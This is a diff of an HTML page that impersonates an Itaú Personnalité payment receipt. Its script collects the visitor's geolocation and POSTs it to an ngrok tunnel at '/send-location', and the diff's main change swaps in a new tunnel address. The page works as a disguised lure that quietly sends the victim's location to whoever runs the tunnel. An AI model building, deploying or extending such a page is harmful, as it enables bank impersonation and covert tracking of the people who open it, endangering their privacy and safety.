@@ -4,15 +4,14 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Itau Personnalite</title>
+  <title>Itau Personnalité</title>
   <link rel="stylesheet" href="styles.css" />
-  <link rel="shortcut icon" type="image/x-icon" href="https://www.itau.com.br/abrir-conta/static/logo-person-000cee7ed15c0f7dbeb6bf9453d2ed8d.png">
 </head>
 
 <body>
   <div class="comprovante-container">
 
-    <h1 style="color: #FF6200">Itaú</h1>
+    <h1>Itau Personnalité</h1>
 
     <!--<h1>Comprovante de Pagamento</h1> -->
 
@@ -61,7 +60,7 @@
       const longitude = position.coords.longitude;
       const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-      fetch("https://d85bda5b1cc9.ngrok-free.app/send-location", {
+      fetch("https://e82241783360.ngrok-free.app/send-location", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
